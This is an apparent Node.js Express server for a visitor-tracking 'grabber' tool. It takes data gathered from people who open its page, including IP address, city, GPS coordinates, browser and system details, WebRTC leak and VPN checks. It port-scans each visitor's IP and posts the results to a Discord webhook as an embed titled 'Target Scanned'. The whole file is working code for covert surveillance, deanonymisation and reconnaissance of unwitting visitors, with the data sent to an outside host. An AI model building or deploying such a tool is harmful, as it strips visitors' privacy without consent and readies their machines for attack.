const express = require('express');
const net = require('net');
const path = require('path'); // Import the 'path' module

const app = express();
app.use(express.json());
const port = 3000;
var webhook_url = "ADD YA TOKEN HERE MATEY"

// Set the view engine to EJS
app.set('view engine', 'ejs');

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.render('index.ejs');
});

app.post('/', (req, res) => {
    res.sendStatus(200);
    var location = req.body.location;
    var systemDetails = req.body.systemDetails;
    var additionalDetails = req.body.additionalDetails;
    var referrer = req.body.referrer;
    var userTimezone = req.body.userTimezone;
    var language = req.body.language;
    var screenResolution = req.body.screenResolution;
    var gpsValue = req.body.gpsValue;
    var vpnMessage = req.body.vpnMessage;
    var webrtcResult = req.body.webrtcResult;

    scanCommonPorts(location.ip)
        .then((openPorts) => {
            console.log(`Open ports on ${location.ip}:`, openPorts);

            console.log("port scan successful");

            if (!systemDetails.connectionType) {
                systemDetails.connectionType = "N/A";
                console.log("Connection Type is Unknown");
                console.log(systemDetails.connectionType);
            }
            var embeds = [{
                "title": "Target Scanned",
                "color": 65280,
                "fields": [
                    {
                        "name": "IP Address",
                        "value": location.ip,
                        "inline": true
                    },
                    {
                        "name": "Location",
                        "value": `${location.city}, ${location.region}, ${location.country_name}`,
                        "inline": true
                    },
                    {
                        "name": "GPS Coordinates",
                        "value": gpsValue,
                        "inline": true
                    },
                    {
                        "name": "Operating System",
                        "value": systemDetails.operatingSystem,
                        "inline": true
                    },
                    {
                        "name": "Browser",
                        "value": systemDetails.browser,
                        "inline": true
                    },
                    {
                        "name": "Screen Resolution",
                        "value": screenResolution,
                        "inline": true
                    },
                    {
                        "name": "Referrer",
                        "value": referrer,
                        "inline": true
                    },
                    {
                        "name": "Time Zone",
                        "value": userTimezone,
                        "inline": true
                    },
                    {
                        "name": "Language",
                        "value": language,
                        "inline": true
                    },
                    {
                        "name": "Device Type",
                        "value": additionalDetails.deviceType,
                        "inline": true
                    },
                    {
                        "name": "Browser Version",
                        "value": additionalDetails.browserVersion,
                        "inline": true
                    },
                    {
                        "name": "Connection Type",
                        "value": additionalDetails.connectionType || "Unknown",
                        "inline": true
                    },
                    {
                        "name": "Do Not Track",
                        "value": additionalDetails.doNotTrack,
                        "inline": true
                    },
                    {
                        "name": "Time Zone vs IP Location",
                        "value": vpnMessage,
                        "inline": true
                    },
                    {
                        "name": "WebRTC Leak Status",
                        "value": webrtcResult,
                        "inline": true
                    },
                    {
                        "name": "Open Ports",
                        "value": openPorts.join(', ') || "None",
                        "inline": true
                    }
                ]
            }];
            sendDiscordMessage(embeds);
        })
        .catch((error) => {
            console.error('Error during port scan:', error.message);
        });
});

// Function to send data to the Discord webhook
function sendDiscordMessage(embeds, retryCount = 3) {
    const maxRetries = 3;
    const retryDelay = 3000;

    fetch(webhook_url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: embeds })
    })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to send message to Discord. Response:', response.status, response.statusText);
                if (retryCount > 0) {
                    // Retry sending the webhook with exponential backoff
                    setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
                } else {
                    console.error('Max retries reached. Giving up on sending message to Discord.');
                }
            } else {
                console.log('Message sent successfully to Discord.');
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord:', error);
            if (retryCount > 0) {
                // Retry sending the webhook with exponential backoff
                setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
            } else {
                console.error('Max retries reached. Giving up on sending message to Discord.');
            }
        });
}


function scanCommonPorts(ip, timeout = 2000) {
    const commonPorts = [
        20, 21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995,
        135, 137, 138, 139,
        161, 162,
        389, 636,
        445,
        3389,
        5900,
        3306,
        5432,
        123,
        8080, 8081, 3128,
        5060,
        1935, 3478, 3479, 3480, 554, 5678, 8000, 8086, 8087, 8088, 19302,
        8096, 32400, 5060, 8081

      ];
      
    const openPorts = [];

    const connect = (port) => new Promise((resolve) => {
        const socket = new net.Socket();

        socket.setTimeout(timeout);

        socket.on('connect', () => {
            socket.destroy();
            resolve(port);
        });

        socket.on('timeout', () => {
            socket.destroy();
            resolve(null);
        });

        socket.on('error', () => {
            socket.destroy();
            resolve(null);
        });

        socket.connect(port, ip);
    });

    const promises = commonPorts.map((port) => connect(port));

    return Promise.all(promises)
        .then((results) => results.filter((port) => port !== null));
}



app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
